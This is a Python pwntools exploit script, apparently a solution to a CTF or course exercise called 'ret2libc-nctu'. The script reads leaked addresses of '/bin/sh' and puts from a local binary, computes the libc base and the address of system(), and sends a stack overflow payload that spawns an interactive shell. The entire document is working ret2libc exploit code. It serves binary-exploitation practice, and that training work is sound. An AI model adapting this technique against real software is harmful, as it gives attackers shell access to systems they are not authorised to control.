from pwn import *

p = process('./ret2libc-nctu')

p.recvuntil("The address of \"/bin/sh\" is ")

binsh_addr = int(
    p.recvuntil("The address of function \"puts\" is ", drop=True)[:-1], 16)

puts_addr = p.recv()[:-1]

libc = ELF('./libc6.so')

basic_addr = int(puts_addr, 16) - libc.symbols['puts']
system_addr = basic_addr + libc.symbols['system']

payload = flat(['a' * 0x20, system_addr, 0xdeadbeef, binsh_addr])

p.sendline(payload)
p.interactive()